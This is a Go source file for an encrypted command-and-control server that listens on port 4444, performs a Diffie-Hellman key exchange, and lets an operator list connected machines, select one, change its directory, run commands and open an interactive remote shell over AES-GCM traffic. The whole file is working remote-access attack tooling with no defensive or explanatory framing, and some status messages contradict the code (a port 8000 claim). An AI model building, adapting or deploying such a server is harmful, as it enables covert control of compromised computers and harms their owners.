package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"math/big"
	"net"
	"os"
	"strconv"
	"strings"
)

const (
	HEADER_LENGTH = 1024
	CONNECT       = 0
	CHANGE_DIR    = 1
	COMMAND       = 2
	RESPONSE      = 3
)

var (
	prime = []byte("0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AAAC42DAD33170D04507A33A85521ABDF1CBA64ECFB850458DBEF0A8AEA71575D060C7DB3970F85A6E1E4C7ABF5AE8CDB0933D71E8C94E04A25619DCEE3D2261AD2EE6BF12FFA06D98A0864D87602733EC86A64521F2B18177B200CBBE117577A615D6C770988C0BAD946E208E24FA074E5AB3143DB5BFCE0FD108E4B82D120A92108011A723C12A787E6D788719A10BDBA5B2699C327186AF4E23C1A946834B6150BDA2583E9CA2AD44CE8DBBBC2DB04DE8EF92E8EFC141FBECAA6287C59474E6BC05D99B2964FA090C3A2233BA186515BE7ED1F612970CEE2D7AFB81BDD762170481CD0069127D5B05AA993B4EA988D8FDDC186FFB7DC90A6C08F4DF435C93402849236C3FAB4D27C7026C1D4DCB2602646DEC9751E763DBA37BDF8FF9406AD9E530EE5DB382F413001AEB06A53ED9027D831179727B0865A8918DA3EDBEBCF9B14ED44CE6CBACED4BB1BDB7F1447E6CC254B332051512BD7AF426FB8F401378CD2BF5983CA01C64B92ECF032EA15D1721D03F482D7CE6E74FEF6D55E702F46980C82B5A84031900B1C9E59E7C97FBEC7E8F323A97A7E36CC88BE0F1D45B7FF585AC54BD407B22B4154AACC8F6D7EBF48E1D814CC5ED20F8037E0A79715EEF29BE32806A1D58BB7C5DA76F550AA3D8A1FBFF0EB19CCB1A313D55CDA56C9EC2EF29632387FE8D76E3C0468043E8F663F4860EE12BF2D5B0B7474D6E694F91E6DCC4024FFFFFFFFFFFFFFFF")
	base  = big.NewInt(2)
)

func CheckError(e error) {
	if e != nil {
		fmt.Println(e)
	}
}

func write_to_file(filename string, text string) {
	_, err := os.Stat(filename)
	if err != nil {
		file, err := os.Create(filename)
		CheckError(err)
		file.WriteString(text)
		file.Close()
	} else {
		file, err := os.Open(filename)
		CheckError(err)
		file.WriteString(text)
		file.Close()
	}
}

type Server struct {
	HostName    string
	Host        string
	Port        string
	Socket      net.Listener
	PrivKey     *big.Int
	PubKey      *big.Int
	AESKey      string
	Addresses   []net.Addr
	Connections []net.Conn
}

func encrypt(data []byte, key []byte) []byte {
	block, err := aes.NewCipher(key)
	CheckError(err)
	gcm, err := cipher.NewGCM(block)
	CheckError(err)
	iv := make([]byte, gcm.NonceSize())
	io.ReadFull(rand.Reader, iv)
	ciphertext := gcm.Seal(iv, iv, data, nil)
	buf := make([]byte, 5)
	_, err = rand.Read(buf)
	CheckError(err)
	ciphertext = append(buf, ciphertext...)
	return ciphertext
}

func decrypt(ciphertext []byte, key []byte) []byte {
	block, err := aes.NewCipher(key)
	CheckError(err)
	if len(ciphertext) < aes.BlockSize {
		panic("ciphertext too short")
	}
	iv := ciphertext[5:17]
	ciphertext = ciphertext[17:]
	gcm, err := cipher.NewGCM(block)
	CheckError(err)
	plaintext, err := gcm.Open(nil, iv, ciphertext, nil)
	CheckError(err)
	return plaintext
}

func (s *Server) send(conn net.Conn, action int, data string) {
	key, _ := hex.DecodeString(s.AESKey)
	encrypted_data := encrypt([]byte(data), key)
	length := fmt.Sprint(len(encrypted_data))
	encrypted_header := encrypt([]byte(fmt.Sprint(action)+length), key)
	buffer := strings.Repeat(" ", HEADER_LENGTH-len(encrypted_header))
	conn.Write([]byte(string(encrypted_header) + buffer + string(encrypted_data)))
}

func (s *Server) receive(conn net.Conn) (int, string) {
	key, _ := hex.DecodeString(s.AESKey)
	reader := bufio.NewReader(conn)
	header := make([]byte, HEADER_LENGTH)
	reader.Read(header)
	decrypted_header := decrypt([]byte(strings.TrimSpace(string(header))), key)
	action, err := strconv.Atoi(string(decrypted_header[0]))
	CheckError(err)
	length, err := strconv.Atoi(string(decrypted_header[1:]))
	CheckError(err)
	data := make([]byte, length)
	reader.Read(data)
	return action, string(decrypt(data, key))
}

func (s *Server) generatePrivateKey() {
	priv_key := make([]byte, 540)
	_, err := rand.Read(priv_key)
	CheckError(err)
	s.PrivKey = new(big.Int).SetBytes(priv_key)
}

func (s *Server) generatePublicKey() {
	parsed_prime := big.NewInt(0)
	parsed_prime.UnmarshalText(prime)
	var pub_key big.Int
	pub_key.Exp(base, s.PrivKey, parsed_prime)
	s.PubKey = &pub_key
}

func (s *Server) performKeyExchange(conn net.Conn) {
	reader := bufio.NewReader(conn)
	header := make([]byte, HEADER_LENGTH)
	reader.Read(header)
	length, err := strconv.Atoi(strings.TrimSpace(string(header)))
	CheckError(err)
	data := make([]byte, length)
	reader.Read(data)
	remote_pub_key := data
	key_length := fmt.Sprint(len(s.PubKey.Bytes()))
	buffer := strings.Repeat(" ", HEADER_LENGTH-len(key_length))
	send_header := key_length + buffer
	conn.Write(append([]byte(send_header), s.PubKey.Bytes()...))
	s.getKey(remote_pub_key)
}

func (s *Server) getKey(remote_pub_key []byte) {
	pub_key_int := big.NewInt(0)
	pub_key_int.SetBytes(remote_pub_key)
	parsed_prime := big.NewInt(0)
	parsed_prime.UnmarshalText(prime)
	var shared_secret big.Int
	shared_secret.Exp(pub_key_int, s.PrivKey, parsed_prime)
	hash := sha256.New()
	hash.Write(shared_secret.Bytes())
	md := hash.Sum(nil)
	mdStr := hex.EncodeToString(md)
	s.AESKey = mdStr
	fmt.Println("Key: ", mdStr)
}

func (s *Server) handle_connection(conn net.Conn) {
	s.generatePrivateKey()
	s.generatePublicKey()
	s.performKeyExchange(conn)
	shell_mode := false
	prompt := "\nGoGo*⨠ "
	for {
		reader := bufio.NewReader(os.Stdin)
		fmt.Print(prompt)
		cmd, err := reader.ReadString('\n')
		CheckError(err)
		command := strings.TrimSpace(string(cmd))
		args := strings.Split(command, " ")
		if shell_mode {
			if args[0] == "quit" {
				shell_mode = false
				prompt = "\nGoGo*⨠ "
			}
			s.send(conn, COMMAND, command)
			_, data := s.receive(conn)
			fmt.Println(data)
			continue
		}
		if args[0] == "quit" {
			break
		}
		if args[0] == "cd" {
			s.send(conn, CHANGE_DIR, args[1])
			_, cwd := s.receive(conn)
			prompt = cwd + "> "
			continue
		}
		if args[0] == "shell" {
			s.send(conn, COMMAND, args[0])
			_, cwd := s.receive(conn)
			prompt = cwd + "> "
			shell_mode = true
			continue
		}
		if args[0] == "run" {
			s.send(conn, COMMAND, command)
			_, data := s.receive(conn)
			fmt.Println(data)
			continue
		}
		fmt.Println("command '" + command + "' not recognized")
	}

}

func (s *Server) accept_connections() {
	for {
		conn, err := s.Socket.Accept()
		CheckError(err)
		s.Addresses = append(s.Addresses, conn.RemoteAddr())
		s.Connections = append(s.Connections, conn)
	}
}

func (s *Server) list_connections() {
	for i, address := range s.Addresses {
		fmt.Println("[", i+1, "]", address.String())
	}
}

func (s *Server) start() {
	fmt.Println("Starting server...")
	var err error
	s.Socket, err = net.Listen("tcp", "192.168.1.5:4444")
	CheckError(err)
	fmt.Println("Server listening onport 8000.")
	fmt.Println("Waiting for inoming connections...")
}

func (s *Server) run_dashboard() {
	for {
		reader := bufio.NewReader(os.Stdin)
		fmt.Print("Enter command: ")
		cmd, err := reader.ReadString('\n')
		CheckError(err)
		args := strings.Split(strings.TrimSpace(cmd), " ")
		if args[0] == "list" {
			s.list_connections()
		}
		if args[0] == "select" {
			index, err := strconv.Atoi(args[1])
			CheckError(err)
			conn := s.Connections[index-1]
			s.handle_connection(conn)
		}
	}
}

func main() {

	name, err := os.Hostname()
	CheckError(err)
	server := Server{
		HostName: name,
		Host:     "192.168.1.5",
		Port:     "4444",
	}
	server.start()
	go server.accept_connections()
	server.run_dashboard()
}
